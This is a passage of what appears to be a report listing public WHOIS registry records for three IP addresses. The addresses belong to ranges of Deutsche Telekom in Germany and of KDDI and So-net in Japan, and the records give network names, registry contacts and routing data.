<h3>Whois data for: 93.223.169.159</h3>
</summary>


### Whois data for: 93.223.169.159 [https://www.whois.com/whois/93.223.169.159](https://www.whois.com/whois/93.223.169.159)

```
% This is the RIPE Database query service.
% The objects are in RPSL format.
%
% The RIPE Database is subject to Terms and Conditions.
% See https://apps.db.ripe.net/docs/HTML-Terms-And-Conditions

% Note: this output has been filtered.
%       To receive output for a database update, use the "-B" flag.

% Information related to '93.192.0.0 - 93.223.255.255'

% Abuse contact for '93.192.0.0 - 93.223.255.255' is '@telekom.de'

inetnum:        93.192.0.0 - 93.223.255.255
netname:        DTAG-DIAL25
descr:          Deutsche Telekom AG
org:            ORG-DTAG1-RIPE
country:        DE
admin-c:        DTIP
tech-c:         DTST
status:         ASSIGNED PA
mnt-by:         DTAG-NIC
created:        2008-02-14T08:46:03Z
last-modified:  2014-06-18T06:29:34Z
source:         RIPE

organisation:   ORG-DTAG1-RIPE
org-name:       Deutsche Telekom AG
org-type:       OTHER
address:        Group Information Security, SDA/Abuse
address:        Deutsche Telekom Allee 9
address:        DE 64295 Darmstadt
remarks:        abuse contact in case of Spam,
                hack attacks, illegal activity,
                violation, scans, probes, etc.
mnt-ref:        DTAG-NIC
mnt-by:         DTAG-NIC
abuse-c:        DTAG4-RIPE
created:        2014-06-17T11:47:04Z
last-modified:  2021-02-22T13:35:19Z
source:         RIPE # Filtered

person:         DTAG Global IP-Addressing
address:        Deutsche Telekom AG
address:        Darmstadt, Germany
phone:          +49 180 2 33 1000
nic-hdl:        DTIP
mnt-by:         DTAG-NIC
created:        2003-01-29T10:22:59Z
last-modified:  2019-05-14T12:55:19Z
source:         RIPE # Filtered

person:         Security Team
address:        Deutsche Telekom AG
address:        Darmstadt, Germany
phone:          +49 180 2 33 1000
nic-hdl:        DTST
mnt-by:         DTAG-NIC
created:        2003-01-29T10:31:11Z
last-modified:  2019-05-14T12:56:39Z
source:         RIPE # Filtered

% Information related to '93.192.0.0/10AS3320'

route:          93.192.0.0/10
descr:          Deutsche Telekom AG
                Internet Service Provider
origin:         AS3320
member-of:      AS3320:RS-PA-TELEKOM
mnt-by:         DTAG-RR
created:        2008-02-13T12:30:44Z
last-modified:  2008-02-13T12:30:44Z
source:         RIPE

% This query was served by the RIPE Database Query Service version 1.109.1 (ABERDEEN)
```

</details>

---


<details>
<summary>
<h3>Whois data for: 27.93.25.111</h3>
</summary>


### Whois data for: 27.93.25.111 [https://www.whois.com/whois/27.93.25.111](https://www.whois.com/whois/27.93.25.111)

```
% [whois.apnic.net]
% Whois data copyright terms    http://www.apnic.net/db/dbcopyright.html

% Information related to '27.80.0.0 - 27.95.255.255'

% Abuse contact for '27.80.0.0 - 27.95.255.255' is '@nic.ad.jp'

inetnum:        27.80.0.0 - 27.95.255.255
netname:        KDDI
descr:          KDDI CORPORATION
descr:          GARDEN AIR TOWER,3-10-10,Iidabashi,Chiyoda-ku,Tokyo
country:        JP
admin-c:        JNIC1-AP
tech-c:         JNIC1-AP
status:         ALLOCATED PORTABLE
remarks:        Email address for spam or abuse complaints @dion.ne.jp
mnt-by:         MAINT-JPNIC
mnt-irt:        IRT-JPNIC-JP
mnt-lower:      MAINT-JPNIC
last-modified:  2015-12-01T22:32:57Z
source:         APNIC

irt:            IRT-JPNIC-JP
address:        Uchikanda OS Bldg 4F, 2-12-6 Uchi-Kanda
address:        Chiyoda-ku, Tokyo 101-0047, Japan
e-mail:         @nic.ad.jp
abuse-mailbox:  @nic.ad.jp
phone:          +81-3-5297-2311
fax-no:         +81-3-5297-2312
admin-c:        JNIC1-AP
tech-c:         JNIC1-AP
auth:           # Filtered
remarks:        @nic.ad.jp was validated on 2020-07-23
mnt-by:         MAINT-JPNIC
last-modified:  2022-06-14T04:26:58Z
source:         APNIC

role:           Japan Network Information Center
address:        Uchikanda OS Bldg 4F, 2-12-6 Uchi-Kanda
address:        Chiyoda-ku, Tokyo 101-0047, Japan
country:        JP
phone:          +81-3-5297-2311
fax-no:         +81-3-5297-2312
e-mail:         @nic.ad.jp
admin-c:        JI13-AP
tech-c:         JE53-AP
nic-hdl:        JNIC1-AP
mnt-by:         MAINT-JPNIC
last-modified:  2022-01-05T03:04:02Z
source:         APNIC

% Information related to '27.93.25.0 - 27.93.25.255'

inetnum:        27.93.25.0 - 27.93.25.255
netname:        KDDI-NET
descr:          KDDI CORPORATION
country:        JP
admin-c:        JP00000127
tech-c:         JP00000181
remarks:        This information has been partially mirrored by APNIC from
remarks:        JPNIC. To obtain more specific information, please use the
remarks:        JPNIC WHOIS Gateway at
remarks:        http://www.nic.ad.jp/en/db/whois/en-gateway.html or
remarks:        whois.nic.ad.jp for WHOIS client. (The WHOIS client
remarks:        defaults to Japanese output, use the /e switch for English
remarks:        output)
last-modified:  2011-03-24T18:17:04Z
source:         JPNIC

% This query was served by the APNIC Whois Service version 1.88.25 (WHOIS-US3)
```

</details>

---


<details>
<summary>
<h3>Whois data for: 111.216.194.148</h3>
</summary>


### Whois data for: 111.216.194.148 [https://www.whois.com/whois/111.216.194.148](https://www.whois.com/whois/111.216.194.148)

```
% [whois.apnic.net]
% Whois data copyright terms    http://www.apnic.net/db/dbcopyright.html

% Information related to '111.216.0.0 - 111.217.255.255'

% Abuse contact for '111.216.0.0 - 111.217.255.255' is '@nic.ad.jp'

inetnum:        111.216.0.0 - 111.217.255.255
netname:        So-net
descr:          Sony Network Communications Inc.
descr:          4-12-3, Higashishinagawa, Shinagawa-ku, Tokyo, 140-0002, Japan
admin-c:        JNIC1-AP
tech-c:         JNIC1-AP
remarks:        Email address for spam or abuse complaints : @so-net.ne.jp
country:        JP
mnt-by:         MAINT-JPNIC
mnt-lower:      MAINT-JPNIC
mnt-irt:        IRT-JPNIC-JP
status:         ALLOCATED PORTABLE
last-modified:  2016-07-15T07:17:40Z
source:         APNIC

irt:            IRT-JPNIC-JP
address:        Uchikanda OS Bldg 4F, 2-12-6 Uchi-Kanda
address:        Chiyoda-ku, Tokyo 101-0047, Japan
e-mail:         @nic.ad.jp
abuse-mailbox:  @nic.ad.jp
phone:          +81-3-5297-2311
fax-no:         +81-3-5297-2312
admin-c:        JNIC1-AP
tech-c:         JNIC1-AP
auth:           # Filtered
remarks:        @nic.ad.jp was validated on 2020-07-23
mnt-by:         MAINT-JPNIC
last-modified:  2022-06-14T04:26:58Z
source:         APNIC

role:           Japan Network Information Center
address:        Uchikanda OS Bldg 4F, 2-12-6 Uchi-Kanda
address:        Chiyoda-ku, Tokyo 101-0047, Japan
country:        JP
phone:          +81-3-5297-2311
fax-no:         +81-3-5297-2312
e-mail:         @nic.ad.jp
admin-c:        JI13-AP
tech-c:         JE53-AP
nic-hdl:        JNIC1-AP
mnt-by:         MAINT-JPNIC
last-modified:  2022-01-05T03:04:02Z
source:         APNIC

% Information related to '111.216.192.0 - 111.216.199.255'

inetnum:        111.216.192.0 - 111.216.199.255
netname:        SO-NET
descr:          So-net Service
country:        JP
admin-c:        JP00001330
tech-c:         JP00001330
remarks:        This information has been partially mirrored by APNIC from
remarks:        JPNIC. To obtain more specific information, please use the
remarks:        JPNIC WHOIS Gateway at
remarks:        http://www.nic.ad.jp/en/db/whois/en-gateway.html or
remarks:        whois.nic.ad.jp for WHOIS client. (The WHOIS client
remarks:        defaults to Japanese output, use the /e switch for English
remarks:        output)
last-modified:  2022-10-06T05:14:03Z
source:         JPNIC

% This query was served by the APNIC Whois Service version 1.88.25 (WHOIS-US3)
```

</details>

---


</details>

---

